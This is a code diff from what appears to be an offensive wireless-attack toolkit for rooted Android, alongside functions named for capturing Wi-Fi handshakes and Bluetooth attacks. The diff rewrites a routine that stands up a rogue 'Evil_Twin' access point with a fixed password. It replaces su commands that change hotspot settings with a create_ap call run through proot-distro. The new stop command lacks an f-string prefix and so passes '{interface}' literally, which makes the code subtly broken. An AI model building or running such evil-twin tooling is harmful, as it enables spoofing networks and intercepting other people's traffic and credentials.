@@ -296,32 +296,19 @@ def capture_handshakes(interface):
 
 def create_multiple_aps(interface):
     try:
-        print(f"{Fore.CYAN}[i] Please enable your hotspot manually first{Fore.RESET}")
-        input(f"{Fore.YELLOW}[?] Press Enter after enabling hotspot...{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] Starting AP...{Fore.RESET}")
         
-        print(f"{Fore.GREEN}[+] Modifying hotspot settings...{Fore.RESET}")
-        
-        commands = [
-            # Configure the already-enabled hotspot
-            "su -c 'settings put global wifi_ap_band 2'",
-            "su -c 'settings put global wifi_ap_passwd 12345678'",
-            "su -c 'settings put global wifi_ap_ssid Evil_Twin'",
-        ]
-        
-        for cmd in commands:
-            print(f"{Fore.YELLOW}[*] Running: {cmd}{Fore.RESET}")
-            os.system(cmd)
-            time.sleep(1)
-        
-        print(f"{Fore.GREEN}[+] Settings applied! Your hotspot should now show:{Fore.RESET}")
-        print(f"{Fore.GREEN}[+] SSID: Evil_Twin{Fore.RESET}")
-        print(f"{Fore.GREEN}[+] Password: 12345678{Fore.RESET}")
+        # Create AP using create_ap
+        ap_command = f"proot-distro login ubuntu -- create_ap {interface} {interface} Evil_Twin 12345678"
+        print(f"{Fore.YELLOW}[*] Running: {ap_command}{Fore.RESET}")
+        os.system(ap_command)
         
         while True:
             time.sleep(1)
             
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}[*] Restoring original settings...{Fore.RESET}")
+        print(f"\n{Fore.YELLOW}[*] Stopping AP...{Fore.RESET}")
+        os.system("proot-distro login ubuntu -- create_ap --stop {interface}")
 
 def bluetooth_attacks():
     if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
